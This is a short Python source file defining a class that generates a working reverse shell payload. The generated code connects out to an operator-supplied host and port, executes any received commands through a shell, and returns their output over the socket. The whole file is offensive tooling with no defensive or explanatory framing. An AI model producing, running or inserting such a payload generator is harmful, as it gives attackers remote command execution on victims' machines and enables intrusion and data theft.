#!/usr/bin/env python3

class PythonShellGenerator:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
    
    def generate_reverse_shell(self):
        """Generate Python reverse shell"""
        py_code = f'''
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{self.lhost}", {self.lport}))

while True:
    data = s.recv(1024).decode()
    if data.lower() == "exit":
        break
    if data.startswith("cd "):
        try:
            os.chdir(data[3:].strip())
            s.send(b"Changed directory\\n")
        except Exception as e:
            s.send(str(e).encode() + b"\\n")
    else:
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
                                stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)

s.close()
'''
        return py_code.strip()